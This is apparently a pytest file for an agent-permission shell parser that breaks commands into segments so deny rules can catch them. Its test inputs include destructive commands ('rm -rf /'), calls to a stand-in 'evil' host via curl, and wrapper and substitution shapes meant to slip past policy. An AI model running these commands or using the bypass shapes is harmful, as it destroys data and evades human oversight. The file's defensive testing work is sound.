"""Shell parser tests — the cases that broke the hand-rolled regex parser."""

from __future__ import annotations

from agentperms import parse_pipeline


def test_empty_command_is_parseable():
    pipeline = parse_pipeline("")
    assert pipeline.parseable
    assert pipeline.segments == ()


def test_single_command_argv():
    pipeline = parse_pipeline("ls -la /tmp")
    assert pipeline.parseable
    assert len(pipeline.segments) == 1
    assert pipeline.segments[0].argv == ("ls", "-la", "/tmp")
    assert pipeline.segments[0].redirects == ()


def test_fd_dup_2_to_1_is_not_a_file_write():
    """The original bug: regex parsed `2>&1` as a file write to '1'."""
    pipeline = parse_pipeline("cat foo 2>&1")
    assert pipeline.parseable
    [segment] = pipeline.segments
    assert segment.argv == ("cat", "foo")
    [redirect] = segment.redirects
    assert redirect.is_fd_dup is True
    assert redirect.fd == 2
    assert redirect.target == "1"


def test_stderr_to_dev_null_is_recognized():
    pipeline = parse_pipeline("cat foo 2>/dev/null")
    [segment] = pipeline.segments
    [redirect] = segment.redirects
    assert redirect.is_fd_dup is False
    assert redirect.fd == 2
    assert redirect.target == "/dev/null"


def test_pipe_extracts_two_segments():
    pipeline = parse_pipeline("cat foo 2>/dev/null | head -60")
    assert len(pipeline.segments) == 2
    assert pipeline.segments[0].argv == ("cat", "foo")
    assert pipeline.segments[1].argv == ("head", "-60")


def test_compound_and_or_extracts_all_segments():
    """`test -f x && sed -n 1,10p x || true` — three real commands."""
    pipeline = parse_pipeline("test -f x && sed -n 1,10p x || true")
    assert pipeline.parseable
    argvs = [s.argv for s in pipeline.segments]
    assert ("test", "-f", "x") in argvs
    assert ("sed", "-n", "1,10p", "x") in argvs
    assert ("true",) in argvs


def test_for_loop_extracts_body_commands_only():
    pipeline = parse_pipeline(
        'for v in 0.0.34 0.0.32; do echo "=== @playwright/mcp@$v ==="; '
        'npm view "@playwright/mcp@$v" dependencies 2>&1 | head -8; done'
    )
    assert pipeline.parseable
    assert [segment.argv for segment in pipeline.segments] == [
        ("echo", "=== @playwright/mcp@$v ==="),
        ("npm", "view", "@playwright/mcp@$v", "dependencies"),
        ("head", "-8"),
    ]
    assert pipeline.segments[1].redirects[0].is_fd_dup is True


def test_command_substitution_extracts_inner_segments():
    """``rm $(cat allowed)`` — outer command and substitution inner commands are separate segments."""
    pipeline = parse_pipeline("rm $(cat allowed)")
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [("rm",), ("cat", "allowed")]


def test_env_assignment_prefix_stripped():
    """``FOO=bar BAZ=qux ls -la`` — leading environment assignments are skipped."""
    pipeline = parse_pipeline("FOO=bar BAZ=qux ls -la")
    [segment] = pipeline.segments
    assert segment.argv == ("ls", "-la")


def test_env_wrapper_decomposes_to_inner_command():
    """``env -i PATH=/usr/bin git status`` decomposes to the inner ``git status``:
    ``env``'s no-arg ``-i`` and ``NAME=value`` assignments are skipped, so a rule on
    the real command (``git``) applies rather than one on the ``env`` wrapper."""
    pipeline = parse_pipeline("env -i PATH=/usr/bin git status")
    [segment] = pipeline.segments
    assert segment.argv == ("git", "status")


def test_file_write_redirect_captured():
    pipeline = parse_pipeline("echo hi > out.txt")
    [segment] = pipeline.segments
    [redirect] = segment.redirects
    assert redirect.op == ">"
    assert redirect.target == "out.txt"
    assert redirect.is_fd_dup is False


def test_append_redirect_captured():
    pipeline = parse_pipeline("echo hi >> log")
    [segment] = pipeline.segments
    [redirect] = segment.redirects
    assert redirect.op == ">>"


def test_words_after_redirect_target_are_argv_not_redirect_targets():
    """``wc -l a.py 2>/dev/null b.py`` is bash for ``wc -l a.py b.py 2>/dev/null``.

    tree-sitter-bash glues the trailing ``b.py`` onto the file_redirect node as
    a second ``word`` child; previously we picked the last word as the target
    and emitted ``writes to 'b.py'``, which would have prompted on a benign
    ``wc`` invocation.
    """
    pipeline = parse_pipeline("wc -l a.py 2>/dev/null b.py 2>/dev/null c.py 2>/dev/null")
    assert pipeline.parseable
    [segment] = pipeline.segments
    assert segment.argv == ("wc", "-l", "a.py", "b.py", "c.py")
    assert all(r.target == "/dev/null" and r.fd == 2 for r in segment.redirects)
    assert len(segment.redirects) == 3


def test_compound_with_trailing_redirect_yields_all_segments():
    """``cmd1 && cmd2 2>/dev/null arg`` — tree-sitter wraps the whole sequence
    under a single ``redirected_statement`` with a ``list`` child. We need to
    yield all inner segments and bind the redirect (plus spillover argv) to
    the last one, not bail with ``unsupported redirected statement part 'list'``.
    """
    pipeline = parse_pipeline(
        "ls tests/ | head -30 && echo '---' && wc -l a.py 2>/dev/null b.py 2>/dev/null"
    )
    assert pipeline.parseable
    argvs = [s.argv for s in pipeline.segments]
    assert ("ls", "tests/") in argvs
    assert ("head", "-30") in argvs
    assert ("echo", "---") in argvs
    assert ("wc", "-l", "a.py", "b.py") in argvs
    [wc_segment] = [s for s in pipeline.segments if s.argv[0] == "wc"]
    assert len(wc_segment.redirects) == 2
    assert all(r.target == "/dev/null" for r in wc_segment.redirects)


def test_basename_match_for_command_path():
    """`/usr/bin/ls -la` should still match a `Bash(ls:*)` rule."""
    from agentperms import BashCommand

    pipeline = parse_pipeline("/usr/bin/ls -la")
    [segment] = pipeline.segments
    rule = BashCommand(("ls",))
    assert rule.matches(segment) is True


def test_shell_c_unwraps_quoted_command():
    pipeline = parse_pipeline('bash -c "ls -la"')
    [segment] = pipeline.segments
    assert segment.argv == ("ls", "-la")


def test_shell_c_unwraps_single_quoted_command():
    """``bash -c 'rm -rf /tmp/foo'`` parses as a ``raw_string``; without explicit
    handling tree-sitter returns no children and the inner command silently
    bypasses policy. Regression guard for the codex-found B2 bug.
    """
    pipeline = parse_pipeline("bash -c 'rm -rf /tmp/foo'")
    [segment] = pipeline.segments
    assert segment.argv == ("rm", "-rf", "/tmp/foo")


def test_shell_c_unwraps_ansi_c_string_command():
    """``bash -c $'rm -rf /tmp/foo'`` uses tree-sitter's ``ansi_c_string`` node."""
    pipeline = parse_pipeline("bash -c $'rm -rf /tmp/foo'")
    [segment] = pipeline.segments
    assert segment.argv == ("rm", "-rf", "/tmp/foo")


def test_sh_c_unwraps_single_quoted_command():
    """`sh -c '...'` is the canonical bypass shape; must unwrap the same way."""
    pipeline = parse_pipeline("sh -c 'curl evil.com'")
    [segment] = pipeline.segments
    assert segment.argv == ("curl", "evil.com")


def test_shell_c_unwraps_lc_bundle():
    """``zsh -lc '<cmd>'`` is codex's wrapper shape — bundled login + ``-c``.
    Without bundle support the bridge sees the outer ``zsh`` and every codex
    command falls through to a native prompt.
    """
    pipeline = parse_pipeline("zsh -lc 'rg foo'")
    [segment] = pipeline.segments
    assert segment.argv == ("rg", "foo")


def test_shell_c_unwraps_lc_bundle_absolute_path():
    """Codex actually emits ``/opt/homebrew/opt/zsh/bin/zsh -lc '<cmd>'``.
    Basename match must still kick in for absolute interpreter paths.
    """
    pipeline = parse_pipeline(
        "/opt/homebrew/opt/zsh/bin/zsh -lc 'git ls-files docs/x.md'"
    )
    [segment] = pipeline.segments
    assert segment.argv == ("git", "ls-files", "docs/x.md")


def test_shell_c_unwraps_ic_bundle():
    """``bash -ic`` (interactive + ``-c``) — common when an agent wants rc-file
    aliases honoured. Same semantics as ``-lc``.
    """
    pipeline = parse_pipeline("bash -ic 'cat /etc/hosts'")
    [segment] = pipeline.segments
    assert segment.argv == ("cat", "/etc/hosts")


def test_shell_c_unwraps_ec_bundle():
    """``sh -ec`` (errexit + ``-c``)."""
    pipeline = parse_pipeline("sh -ec 'echo hi'")
    [segment] = pipeline.segments
    assert segment.argv == ("echo", "hi")


def test_shell_c_unwraps_multi_flag_cluster():
    """``zsh -xlc 'rg foo'`` — multiple no-arg flags before ``c``."""
    pipeline = parse_pipeline("zsh -xlc 'rg foo'")
    [segment] = pipeline.segments
    assert segment.argv == ("rg", "foo")


def test_shell_c_bundle_round_trips_compound_inner():
    """Inner command is re-parsed through the full pipeline, so compound
    structure inside a bundle wrapper composes correctly.
    """
    pipeline = parse_pipeline("zsh -lc 'a && b'")
    assert [s.argv for s in pipeline.segments] == [("a",), ("b",)]


def test_shell_c_does_not_unwrap_o_option_cluster():
    """``zsh -ocorrect 'rg foo'`` must NOT unwrap. ``-o`` takes ``correct`` as
    its option name; ``'rg foo'`` is then a script-file path, not a command
    string. Adversarial repro from the codex review of this change.
    """
    pipeline = parse_pipeline("zsh -ocorrect 'rg foo'")
    [segment] = pipeline.segments
    assert segment.argv == ("zsh", "-ocorrect", "rg foo")


def test_shell_c_does_not_unwrap_co_cluster():
    """``bash -co 'echo ok'``: under POSIX cluster semantics ``-c`` consumes
    the cluster suffix ``o`` as the command string and ``'echo ok'`` becomes
    ``$0``. ``argv[2]`` is NOT the command. Must fall through.
    """
    pipeline = parse_pipeline("bash -co 'echo ok'")
    [segment] = pipeline.segments
    assert segment.argv == ("bash", "-co", "echo ok")


def test_shell_c_does_not_unwrap_capital_o_cluster():
    """``bash -Ocmdhist 'rg foo'`` enables a shopt; ``c`` here is part of the
    option name, not the ``-c`` flag. Capital ``O`` is not in the no-arg
    whitelist, so the cluster fails the safety check.
    """
    pipeline = parse_pipeline("bash -Ocmdhist 'rg foo'")
    [segment] = pipeline.segments
    assert segment.argv == ("bash", "-Ocmdhist", "rg foo")


def test_shell_c_unwraps_split_no_arg_flags_before_c():
    """``bash -l -c 'rg foo'`` — split no-arg flags before ``-c`` are skipped and
    the inner command is unwrapped, so a deny rule on it still bites."""
    pipeline = parse_pipeline("bash -l -c 'rg foo'")
    assert pipeline.parseable
    [segment] = pipeline.segments
    assert segment.argv == ("rg", "foo")


def test_shell_c_unwraps_multiple_split_no_arg_flags():
    """``zsh -i -x -c '…'`` — several split no-arg flags before ``-c``."""
    pipeline = parse_pipeline("zsh -i -x -c 'rm -rf /'")
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [("rm", "-rf", "/")]


def test_exec_wrapper_decomposes_to_inner_command():
    """``command``/``exec``/``nohup``/``nice``/``time`` with clean options decompose
    to the inner command so it can be policed."""
    for command, expected in (
        ("command rm -rf /", ("rm", "-rf", "/")),
        ("exec rm -rf /", ("rm", "-rf", "/")),
        ("nohup rm -rf /", ("rm", "-rf", "/")),
        ("nice rm -rf /", ("rm", "-rf", "/")),
        ("time rm -rf /", ("rm", "-rf", "/")),
        ("command nice rm -rf /", ("rm", "-rf", "/")),
    ):
        pipeline = parse_pipeline(command)
        assert pipeline.parseable, command
        assert [s.argv for s in pipeline.segments] == [expected], command


def test_env_wrapper_skips_options_and_assignments():
    """``env -i FOO=bar rm …`` — env's no-arg ``-i`` and ``NAME=value`` assignments
    are skipped to reach the inner command."""
    pipeline = parse_pipeline("env -i FOO=bar BAZ=qux rm -rf /")
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [("rm", "-rf", "/")]


def test_opaque_exec_wrapper_left_intact():
    """``timeout``/``nice -n``/``sudo`` aren't decomposed (leading positional or
    arg-taking option) — the segment stays whole for decision-time flagging."""
    for command, expected in (
        ("timeout 5 rm -rf /", ("timeout", "5", "rm", "-rf", "/")),
        ("nice -n 10 rm -rf /", ("nice", "-n", "10", "rm", "-rf", "/")),
        ("sudo rm -rf /", ("sudo", "rm", "-rf", "/")),
    ):
        pipeline = parse_pipeline(command)
        assert pipeline.parseable, command
        assert [s.argv for s in pipeline.segments] == [expected], command


def test_shell_c_does_not_unwrap_long_option_norc():
    """``bash --norc -c 'rg foo'`` uses a long option before ``-c``; arg
    shapes for long options vary, so the heuristic deliberately fall through.
    """
    pipeline = parse_pipeline("bash --norc -c 'rg foo'")
    [segment] = pipeline.segments
    assert segment.argv == ("bash", "--norc", "-c", "rg foo")


def test_shell_c_does_not_unwrap_login_only():
    """``zsh -l 'foo'`` has no ``c`` in the cluster; ``'foo'`` is a script
    file, not a command string.
    """
    pipeline = parse_pipeline("zsh -l 'foo'")
    [segment] = pipeline.segments
    assert segment.argv == ("zsh", "-l", "foo")


def test_unparseable_returns_unparseable_reason():
    pipeline = parse_pipeline("ls && && rm")
    assert pipeline.parseable is False
    assert pipeline.unparseable_reason


def test_simple_expansion_kept_as_opaque_arg():
    """``echo $HOME`` — variable expansion is opaque source text, not a fail."""
    pipeline = parse_pipeline("echo $HOME")
    [segment] = pipeline.segments
    assert segment.argv == ("echo", "$HOME")


def test_braced_expansion_kept_as_opaque_arg():
    pipeline = parse_pipeline("cat ${LOG_FILE}")
    [segment] = pipeline.segments
    assert segment.argv == ("cat", "${LOG_FILE}")


def test_concatenation_kept_as_opaque_arg():
    pipeline = parse_pipeline("cat /var/log/$DATE.log")
    [segment] = pipeline.segments
    assert segment.argv == ("cat", "/var/log/$DATE.log")


def test_arithmetic_expansion_kept_as_opaque_arg():
    pipeline = parse_pipeline("echo $((1+1))")
    [segment] = pipeline.segments
    assert segment.argv == ("echo", "$((1+1))")


def test_string_with_braced_expansion_inlines_value_text():
    pipeline = parse_pipeline('echo "hello ${USER}"')
    [segment] = pipeline.segments
    assert segment.argv == ("echo", "hello ${USER}")


def test_concatenation_with_command_substitution_extracts_inner():
    """``cat foo$(date).log`` — substitution nested inside a concatenation extracts inner commands."""
    pipeline = parse_pipeline("cat foo$(date).log")
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [("cat",), ("date",)]


# ---- Control-flow constructs ---------------------------------------------


def test_if_then_extracts_test_and_body():
    pipeline = parse_pipeline("if [ -f x ]; then cat x; fi")
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [("[",), ("cat", "x")]


def test_if_then_else_extracts_both_branches():
    pipeline = parse_pipeline("if [ -f x ]; then cat x; else echo no; fi")
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [("[",), ("cat", "x"), ("echo", "no")]


def test_if_then_elif_extracts_all_branches():
    pipeline = parse_pipeline("if [ -f x ]; then cat x; elif [ -f y ]; then cat y; fi")
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [
        ("[",), ("cat", "x"),
        ("[",), ("cat", "y"),
    ]


def test_while_extracts_condition_and_body():
    pipeline = parse_pipeline('while read line; do echo "$line"; done')
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [("read", "line"), ("echo", "$line")]


def test_until_extracts_condition_and_body():
    pipeline = parse_pipeline("until grep -q done log; do sleep 1; done")
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [("grep", "-q", "done", "log"), ("sleep", "1")]


def test_case_extracts_each_case_body():
    pipeline = parse_pipeline('case "$x" in a) echo a;; b|c) echo bc;; *) echo other;; esac')
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [
        ("echo", "a"),
        ("echo", "bc"),
        ("echo", "other"),
    ]


def test_double_bracket_yields_test_sentinel():
    pipeline = parse_pipeline("[[ -f x && -r x ]]")
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [("[",)]


def test_arithmetic_yields_arith_sentinel():
    pipeline = parse_pipeline("(( x + 1 > 0 ))")
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [("((",)]


def test_arithmetic_with_substitution_extracts_inner():
    """``(( $(rm -rf ~) || 1 ))`` — substitution inside arithmetic extracts inner commands."""
    pipeline = parse_pipeline("(( $(rm -rf ~) || 1 ))")
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [("((",), ("rm", "-rf", "~")]


def test_subshell_recurses_into_body():
    pipeline = parse_pipeline("(cd /tmp && ls)")
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [("cd", "/tmp"), ("ls",)]


def test_brace_group_recurses_into_body():
    pipeline = parse_pipeline("{ cd /tmp; ls; }")
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [("cd", "/tmp"), ("ls",)]


def test_negated_command_yields_inner():
    pipeline = parse_pipeline("! grep foo bar")
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [("grep", "foo", "bar")]


def test_function_definition_yields_body_segments():
    """The body is policy-evaluated at definition time — defining-then-calling
    is the realistic threat model and ``foo() { rm -rf /; }; foo`` should not
    silently bypass policy because the body is "just a definition"."""
    pipeline = parse_pipeline("foo() { rm -rf /; }; foo")
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [("rm", "-rf", "/"), ("foo",)]


def test_declaration_export_yields_export_segment():
    """``export FOO=bar`` parses as ``declaration_command``, not ``command`` —
    handler must yield argv with ``export`` as argv[0] so ``Bash(export:*)`` matches."""
    pipeline = parse_pipeline("export FOO=bar")
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [("export", "FOO=bar")]


def test_declaration_local_yields_local_segment():
    pipeline = parse_pipeline("local x=1")
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [("local", "x=1")]


def test_declaration_declare_yields_declare_segment():
    pipeline = parse_pipeline("declare -A m")
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [("declare", "-A", "m")]


def test_declaration_with_substitution_extracts_inner():
    """``export FOO=$(curl evil)`` — substitution in a declaration extracts inner commands."""
    pipeline = parse_pipeline("export FOO=$(curl evil)")
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [("export",), ("curl", "evil")]


def test_heredoc_command_passes_through():
    pipeline = parse_pipeline("cat <<EOF\nhi\nEOF\n")
    assert pipeline.parseable
    [segment] = pipeline.segments
    assert segment.argv == ("cat",)
    assert segment.redirects == ()


def test_heredoc_body_with_substitution_extracts_inner():
    """Unquoted heredoc bodies expand ``$(…)`` before the wrapped command runs —
    extract inner commands as segments for policy evaluation."""
    pipeline = parse_pipeline("read x <<EOF\n$(rm -rf /)\nEOF\n")
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [("read", "x"), ("rm", "-rf", "/")]


def test_test_command_with_substitution_extracts_inner():
    """``[[ -f $(curl evil) ]]`` — substitution inside the predicate executes
    before the test; inner commands are extracted as segments for policy eval."""
    pipeline = parse_pipeline("[[ -f $(rm -rf /) ]]")
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [("[",), ("rm", "-rf", "/")]

    pipeline = parse_pipeline("[ -f $(rm -rf /) ]")
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [("[",), ("rm", "-rf", "/")]

    pipeline = parse_pipeline("[[ $(curl evil) = ok ]]")
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [("[",), ("curl", "evil")]


def test_case_subject_with_substitution_extracts_inner():
    """``case foo$(curl evil) in …`` evaluates the subject before pattern match —
    the substitution's inner commands are extracted as segments for policy eval."""
    pipeline = parse_pipeline("case foo$(rm -rf /) in *) echo ok;; esac")
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [("rm", "-rf", "/"), ("echo", "ok")]


def test_case_quoted_subject_with_substitution_extracts_inner():
    pipeline = parse_pipeline('case "$(curl evil)" in *) echo ok;; esac')
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [("curl", "evil"), ("echo", "ok")]


def test_for_iterable_with_substitution_extracts_inner():
    """``for f in $(curl evil); do …; done`` — the iterable runs the substitution
    before the loop body; inner commands are extracted as segments for policy eval."""
    pipeline = parse_pipeline("for f in $(curl evil); do echo $f; done")
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [("curl", "evil"), ("echo", "$f")]

    pipeline = parse_pipeline("select f in $(curl evil); do echo $f; done")
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [("curl", "evil"), ("echo", "$f")]

    pipeline = parse_pipeline("for f in <(rm -rf /); do echo $f; done")
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [("rm", "-rf", "/"), ("echo", "$f")]


def test_redirected_test_command():
    """``[ -f x ] 2>/dev/null`` — test_command nested inside redirected_statement."""
    pipeline = parse_pipeline("[ -f x ] 2>/dev/null")
    assert pipeline.parseable
    [segment] = pipeline.segments
    assert segment.argv == ("[",)
    [redirect] = segment.redirects
    assert redirect.fd == 2
    assert redirect.target == "/dev/null"


def test_zsh_lc_with_substitution_in_inner_command():
    """Codex wraps commands in ``zsh -lc '…'``; substitutions inside the inner
    command must be unwrapped and their inner commands extracted as segments."""
    pipeline = parse_pipeline(
        "/opt/homebrew/opt/zsh/bin/zsh -lc 'rg \"pattern\" -n $(git ls-files | rg foo)'"
    )
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [
        ("rg", "pattern", "-n"),
        ("git", "ls-files"),
        ("rg", "foo"),
    ]


def test_bash_c_with_if_round_trips_through_unwrap():
    """``bash -c '…'`` re-parses the inner command; control flow inside must compose."""
    pipeline = parse_pipeline("bash -c 'if [ -f x ]; then cat x; fi'")
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [("[",), ("cat", "x")]


def test_redirected_shell_c_unwraps_inner_command():
    """``zsh -lc "rm -rf /" 2>/dev/null`` — the wrapper sits inside a
    redirected_statement; the inner command must still be unwrapped so a deny
    rule can see it. The trailing redirect attaches to the unwrapped segment."""
    pipeline = parse_pipeline('zsh -lc "rm -rf /" 2>/dev/null')
    assert pipeline.parseable
    [segment] = pipeline.segments
    assert segment.argv == ("rm", "-rf", "/")
    [redirect] = segment.redirects
    assert redirect.fd == 2
    assert redirect.target == "/dev/null"


def test_process_substitution_redirect_target_extracts_inner_command():
    """``cat < <(rm -rf /)`` — the redirect target is a process substitution, not
    a file. It must stay parseable and surface the inner command as a segment so
    a deny rule bites instead of degrading to an unparseable Ask."""
    pipeline = parse_pipeline("cat < <(rm -rf /)")
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [("cat",), ("rm", "-rf", "/")]


def test_substitution_nested_in_redirect_target_word_extracts_inner_command():
    """``echo hi > out$(rm -rf /)`` — a substitution nested inside a concatenation/
    string redirect target must still be extracted, not bailed as unparseable."""
    for command in (
        "echo hi > out$(rm -rf /)",
        'echo hi > "$(rm -rf /)"',
        "echo hi > foo$(rm -rf /)bar",
    ):
        pipeline = parse_pipeline(command)
        assert pipeline.parseable, command
        assert ("rm", "-rf", "/") in [s.argv for s in pipeline.segments], command


def test_redirected_shell_c_spillover_not_appended_to_inner_command():
    """``zsh -lc "rm -rf /" 2>/dev/null harmless`` — ``harmless`` is a positional
    param of the wrapper, not argv of the inner command. It must not corrupt the
    unwrapped inner segment (which would let an exact deny rule miss)."""
    pipeline = parse_pipeline('zsh -lc "rm -rf /" 2>/dev/null harmless')
    assert pipeline.parseable
    [segment] = pipeline.segments
    assert segment.argv == ("rm", "-rf", "/")


def test_nested_if_in_for():
    pipeline = parse_pipeline("for f in *.py; do if [ -f $f ]; then cat $f; fi; done")
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [("[",), ("cat", "$f")]


def test_select_loop_extracts_body():
    """``select`` parses as the same node as ``for`` — body is the do_group."""
    pipeline = parse_pipeline("select x in a b c; do echo $x; done")
    assert pipeline.parseable
    assert [s.argv for s in pipeline.segments] == [("echo", "$x")]
